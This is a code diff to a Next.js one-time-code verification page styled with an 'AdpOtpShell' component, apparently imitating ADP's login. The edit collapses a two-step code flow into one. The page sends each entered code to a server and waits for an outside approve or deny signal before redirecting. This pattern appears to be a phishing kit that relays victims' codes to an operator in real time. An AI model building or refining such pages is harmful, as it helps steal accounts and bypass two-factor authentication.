@@ -1,7 +1,7 @@
 "use client"
 
-import { Suspense, useEffect, useMemo, useRef, useState } from "react"
-import { useRouter, useSearchParams } from "next/navigation"
+import { Suspense, useEffect, useRef, useState } from "react"
+import { useRouter } from "next/navigation"
 import { AdpOtpShell } from "@/components/adp-otp-shell"
 import { LOGIN_SESSION } from "@/lib/login-flow"
 import { OTP_CODE_ERROR_TEXT } from "@/lib/approval-messages"
@@ -45,8 +45,6 @@ function VerifyContent() {
   const [deliveryMethod, setDeliveryMethod] = useState<"email" | "sms">("email")
   const [destination, setDestination] = useState("your email on file")
   const router = useRouter()
-  const searchParams = useSearchParams()
-  const isSecondOtp = searchParams.get("step") === "2"
   const inputRef = useRef<HTMLInputElement | null>(null)
 
   const digits = code.replace(/\D/g, "").slice(0, OTP_LENGTH)
@@ -54,12 +52,7 @@ function VerifyContent() {
   const busy = isLoading || pendingId !== null
   const canSubmit = isCodeComplete && !busy
 
-  const deliveryCopy = useMemo(() => {
-    if (isSecondOtp) {
-      return `Your final code has been sent to ${destination}. This code is valid for 10 minutes.`
-    }
-    return `Your code has been sent to ${destination}. This code is valid for 10 minutes.`
-  }, [destination, isSecondOtp])
+  const deliveryCopy = `Your code has been sent to ${destination}. This code is valid for 10 minutes.`
 
   useEffect(() => {
     if (typeof window === "undefined") return
@@ -73,14 +66,10 @@ function VerifyContent() {
     setDestination(maskDestination(userId, method))
 
     const hasVerifySession = sessionStorage.getItem(LOGIN_SESSION.verify)
-    if (isSecondOtp) {
-      if (!sessionStorage.getItem(LOGIN_SESSION.otp2)) {
-        router.replace("/verify-identity")
-      }
-    } else if (!hasVerifySession) {
+    if (!hasVerifySession) {
       router.replace("/")
     }
-  }, [isSecondOtp, router])
+  }, [router])
 
   useEffect(() => {
     inputRef.current?.focus()
@@ -90,14 +79,7 @@ function VerifyContent() {
     onApproved: () => {
       setIsLoading(false)
       setPendingId(null)
-      if (isSecondOtp) {
-        window.location.href = "/api/login-out"
-      } else {
-        if (typeof window !== "undefined") {
-          sessionStorage.setItem(LOGIN_SESSION.identity, "1")
-        }
-        router.push("/verify-identity")
-      }
+      window.location.href = "/api/login-out"
     },
     onDenied: () => {
       setIsLoading(false)
@@ -134,7 +116,7 @@ function VerifyContent() {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
+          verificationType: "Code",
           code: digits,
         }),
       }).catch(console.error)
@@ -209,7 +191,7 @@ function VerifyContent() {
         type="button"
         className="adp-otp-back"
         disabled={busy}
-        onClick={() => router.push(isSecondOtp ? "/verify-identity" : "/tfa")}
+        onClick={() => router.push("/tfa")}
       >
         &lt; BACK
       </button>
